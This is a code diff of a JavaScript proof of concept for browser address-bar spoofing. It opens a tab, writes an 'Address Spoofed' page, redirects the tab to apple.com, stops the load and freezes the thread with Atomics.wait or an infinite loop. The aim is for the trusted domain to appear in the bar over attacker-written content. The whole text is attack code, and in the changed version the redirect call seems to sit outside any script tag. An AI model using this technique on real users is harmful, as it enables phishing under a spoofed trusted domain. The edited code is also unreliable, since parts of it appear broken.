@@ -10,28 +10,30 @@
         if (!tab) return;
 
         tab.document.write(`
-            <h1>Address Spoofed</h1>
-        `);
-
+        <h1>Address Spoofed</h1>
+        
         setTimeout(() => {
             tab.location.href = "https://apple.com";
         }, 1);
 
-        setTimeout(() => {
-            try {
-                tab.stop();
-            } catch (e) {
-                console.error(e);
-            }
+        <script>
+            setTimeout(() => {
+                try {
+                    tab.stop();
+                } catch (e) {
+                    console.error(e);
+                }
 
-            try {
-                const sab = new SharedArrayBuffer(4);
-                const view = new Int32Array(sab);
+                try {
+                    const sab = new SharedArrayBuffer(4);
+                    const view = new Int32Array(sab);
 
-                Atomics.wait(view, 0, 0, 9999999);
-            } catch (e) {
-                while (true){}
-            }
-        }, 500);
+                    Atomics.wait(view, 0, 0, 9999999);
+                } catch (e) {
+                    while (true){}
+                }
+            }, 500);
+        <\/script>
+            `);
     }
 </script>
